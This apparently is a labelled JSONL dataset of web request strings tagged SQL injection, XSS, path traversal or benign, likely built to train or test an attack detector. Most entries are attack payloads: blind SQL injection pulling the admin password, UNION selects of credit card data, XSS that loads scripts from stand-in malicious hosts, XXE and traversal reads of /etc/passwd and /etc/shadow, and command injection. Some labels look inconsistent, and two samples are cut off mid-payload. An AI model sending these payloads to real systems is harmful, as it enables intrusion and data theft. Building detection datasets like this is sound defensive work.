+{"text": "product_id=%27%20OR%20(SELECT%20LOAD_FILE(CONCAT(%27%5C%5C%5C%5C',(SELECT%20version()),%example.com%5C%5Cdata%27)))--%20", "kind": "sqli"}
+{"text": "book_title=War' or '1'='1", "kind": "sqli"}
+{"text": "category=2' UNION SELECT @@VERSION,SLEEP(5),USER()--", "kind": "sqli"}
+{"text": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 <svg/onload=alert('LogViewerXSS')> (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15", "kind": "xss"}
+{"text": "/downloads/images/../../../passwd", "kind": "path_traversal"}
+{"text": "------FinanceUploadBoundary2021\nContent-Disposition: form-data; name=\"description\"\n\nQuarterly financial configuration upload\n------FinanceUploadBoundary2021\nContent-Disposition: form-data; name=\"configFile\"; filename=\"config.xml\"\nContent-Type: application/xml\n\n<?xml version=\"1.0\"?>\n<!DOCTYPE root [<", "kind": "path_traversal"}
+{"text": "latest smartphone reviews", "kind": "benign"}
+{"text": "config_file=../../../../etc/shadow\u0000.bak; auth=token123456789", "kind": "path_traversal"}
+{"text": "host=example.com; cat /etc/passwd", "kind": "path_traversal"}
+{"text": "Mozilla/5.0 \"><script>eval(atob('YWxlcnQoIlN5c3RlbSBFcnJvciIp'))</script>", "kind": "xss"}
+{"text": "/data/export/csv\r\nX-Evil-Header: yes\r\nContent-Length: 27\r\n\r\n<script>window.location=1</script>", "kind": "xss"}
+{"text": "session_id=2f9a3f7c1d; tracking_id=xyz' OR /*!IF*/(ASCII(SUBSTRING((SELECT/**/password FROM users WHERE username='admin'),1,1))=97, SLEEP(5),0)#; preferred_currency=USD", "kind": "sqli"}
+{"text": "name=&lt;script&gt;alert('XSS_ Vulnerability_Found')&lt;/script&gt;", "kind": "xss"}
+{"text": "expand=settings,preferences", "kind": "benign"}
+{"text": "SW1A 1AA", "kind": "benign"}
+{"text": "user_template=../../../../windows/win.ini\u0000user; jwt_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9", "kind": "path_traversal"}
+{"text": "book_title=Data Structures' or '1'='1", "kind": "sqli"}
+{"text": "/assets/images/../../../etc/passwd", "kind": "path_traversal"}
+{"text": "post_id,title,tags\n877,Exploring New Hiking Trails,Hiking;Outdoors;Travel\n878,My Favorite Coffee Recipes,Coffee;Food;Lifestyle\n879,Photography Tips for Beginners,Photography;Tutorials", "kind": "benign"}
+{"text": "search=&lt;script&gt;alert(&#39;XSS_ Vulnerability_Found&#39;)&lt;/script&gt;", "kind": "xss"}
+{"text": "locale=../../../../var/log/auth.log\u0000en-GB", "kind": "path_traversal"}
+{"text": "thread_id=789&filter_evil_chars=true&thread_id=' UNION SELECT credit_card FROM users--", "kind": "sqli"}
+{"text": "Mozilla/5.0<script>document.body.appendChild(document.createElement('script')).src='https://malicious.in/logs';</script>", "kind": "xss"}
+{"text": "Mozilla/5.0 \"><body onload=eval(atob('YWxlcnQoJ0RyYnRlc3QnKQ=='))> (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0", "kind": "xss"}
+{"text": "template_file=../../../../etc/hosts\u0000index; session_id=6b9c871e67321f23a8d152fbb", "kind": "path_traversal"}
+{"text": "id=320&filter_evil_chars=true&id=320' UNION SELECT credit_card FROM users--&ref=homepage", "kind": "sqli"}
+{"text": "<profile>\n  <username>josephine_w</username>\n  <emailNotifications>true</emailNotifications>\n  <timezone>Europe/Lisbon</timezone>\n</profile>", "kind": "benign"}
+{"text": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE submission [\n<!ELEMENT submission ANY >\n<!ENTITY secret SYSTEM \"file:///etc/passwd\" >]>\n<submission>\n  <thread>452</thread>\n  <comment>&secret;</comment>\n</submission>", "kind": "path_traversal"}
+{"text": "new_password=securePass123\nid\ncat /etc/passwd\nuname -r", "kind": "path_traversal"}
+{"text": "------BoundaryString12345\nContent-Disposition: form-data; name=\"description\"\n\nWeekly configuration import\n------BoundaryString12345\nContent-Disposition: form-data; name=\"uploadFile\"; filename=\"config.xml\"\nContent-Type: application/xml\n\n<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:", "kind": "path_traversal"}
+{"text": "item=900' UNION SELECT @@VERSION, SLEEP(5), USER()--", "kind": "sqli"}
+{"text": "book_title=Lord of the Rings' or '1'='1 or '1'='1", "kind": "sqli"}
+{"text": "cart_id=xyz789abc456", "kind": "benign"}
+{"text": "username=tester&action=submit&comment=welcome&username=admin&action=delete&comment=<script>xss()</script>", "kind": "xss"}
+{"text": "lang_file=../../../../etc/profile\u0000conf; session_token=xyz987654321", "kind": "path_traversal"}
+{"text": "maria gomez", "kind": "benign"}
+{"text": "Mozilla/5.0 \"><script>eval(atob('YWxlcnQoJ1VzZXJBdXRoJykn'))</script> (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1", "kind": "xss"}
+{"text": "postid=%27%20OR%20%28SELECT%20LOAD_FILE%28CONCAT%28%27%5C%5C%5C%5C%27%2C%28SELECT%20version%28%29%29%2C%example.com%5C%5Cdata%27%29%29%29--%20", "kind": "sqli"}
+{"text": "theme=dark&notifications=&timezone=America%2FChicago", "kind": "benign"}
+{"text": "username=clientUser&role=user&comments=All+good&username=admin&role=superadmin&comments=<script>xss()</script>", "kind": "xss"}
+{"text": "book_title=Harry Potter' or '1'='1", "kind": "sqli"}
+{"text": "id=101' UNION SELECT @@VERSION,SLEEP(5),USER()--", "kind": "sqli"}
+{"text": "{\"username\":\"celeritas89\",\"post_id\":1476,\"user_comment\":\"Really love this update! Also, check this out: javascript:alert('XSS')\"}", "kind": "xss"}
+{"text": "session=8fc5e246d8691de7; tracking_id=uvwz' OR IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=97, SLEEP(5),0) --", "kind": "sqli"}
+{"text": "share_location=no&ad_personalization=", "kind": "benign"}
+{"text": "tag=security&tag=hack&id=123&filter_evil_chars=true&id=' UNION SELECT credit_card FROM users--", "kind": "sqli"}
+{"text": "dashboard_layout=../../../var/log/syslog%00; auth_sid=gh476n1d9uvl", "kind": "path_traversal"}
+{"text": "theme_path=../../../../var/www/html/.env\u0000backup; user_id=998877", "kind": "path_traversal"}
+{"text": "<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC53cml0ZS5sb2NhdGlvbik8L3NjcmlwdD4=\"></iframe>", "kind": "xss"}
+{"text": "language_file=../../../../usr/local/apache/conf/httpd.conf\u0000txt; auth=eyJhbGciOiJIUzI1NiJ9", "kind": "path_traversal"}
+{"text": "username=guest&action=view&comment=normal_comment&username=administrator&action=delete&comment=<script>xss()</script>", "kind": "xss"}
+{"text": "b1uN3txlCGrVbQXmpDxzGDc1UsmsFiNpq41DZ67N3XM=", "kind": "benign"}
+{"text": "<!--#exec cmd=\"cat /etc/passwd\"-->", "kind": "path_traversal"}
+{"text": "ui_language=../../../../etc/hosts\u0000lang; sessionid=13fa17828be3322c", "kind": "path_traversal"}
+{"text": "{\"channelId\": \"1234\", \"message\": \"Hello, team! ' AnD (SeLeCt ExIsTs (SeLeCt * FrOm users WhErE role='admin'))--\"}", "kind": "sqli"}
+{"text": "search_term=12' UNION SELECT @@VERSION,SLEEP(5),USER()--", "kind": "sqli"}
+{"text": "category=5' UNION SELECT @@VERSION,SLEEP(5),USER()--", "kind": "sqli"}
+{"text": "id=1024&filter=active&limit=25", "kind": "benign"}
+{"text": "{\"username\": \"john_doe\", \"password\": \"Pa$$w0rd' Or '1'='1\"}", "kind": "sqli"}
+{"text": "{\"fullname\":\"Alex Smith\",\"bio\":\"Developer and tester\",\"website\":\"https://example.com\",\"statusMessage\":\"AvailAble' AnD (SeLeCt UsEr)='admin'-- \"}", "kind": "sqli"}
+{"text": "/static/js/..../..../config.yaml", "kind": "path_traversal"}
+{"text": "sid=4fsal83hjdiwq92u09s", "kind": "benign"}
+{"text": "Googlebot/2.1 (+http://example.com/bot.html)", "kind": "benign"}
+{"text": "/resources/images/../../../../var/www/html/config.php", "kind": "path_traversal"}
+{"text": "{\"user_id\":552,\"preferences\":{\"homepage_module\":\"analytics\",\"safe_mode\":true,\"custom_url\":\"javascript:alert('XSS')\"},\"language\":\"en-US\"}", "kind": "xss"}
+{"text": "Mozilla/5.0 \"><img src=x onerror=eval(atob('YWxlcnQoJ1hTUyBpbiBVQScp'))>", "kind": "xss"}
+{"text": "category=books&filter%5Bgenre%5D=fiction&filter%5Byear_published%5D=published_2022&sort_by=title_asc&page=5", "kind": "benign"}
+{"text": "{\"config\": {\"snippet\": \"<!--#exec cmd='c' + 'a' + 't /etc/passwd'-->\"},\"metadata\": {\"author\": \"devops\"}}", "kind": "path_traversal"}
+{"text": "thread_id=567&user=playerTwo&message=<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>", "kind": "xss"}
+{"text": "Updated config data.", "kind": "benign"}
+{"text": "login=blogger\u0000\u000f\b\u0001<script>alert('x')</script>&passwd=password123", "kind": "xss"}
+{"text": "{\"profile_url\": \"/user/12345\r\nCache-Control: no-store\r\nLocation: http://example.com\r\n\r\n<script>document.location='http://malware.site'</script>\"}", "kind": "xss"}
+{"text": "{\n  \"<img src=x onerror=\\\"eval(String.fromCharCode(0x61,108,0145,114,0x74,40,0x27,88,0x53,0123,45,0x4b,101,0x79,0x27,41))\\\">\": \"draft-tags\",\n  \"post_id\": \"post_20240604_01\",\n  \"tags\": [\"tech\", \"xss\", \"security\"],\n  \"updated\": true\n}", "kind": "xss"}
+{"text": "{\n  \"<img src=x onerror=\\\"eval(String.fromCharCode(0x61,108,0145,114,0x74,40,0x27,88,0x53,0123,45,0x4b,101,0x79,0x27,41))\\\">\": \"config-params\",\n  \"region\": \"us-west-2\",\n  \"deployment\": \"blue-green\",\n  \"active\": false\n}", "kind": "xss"}
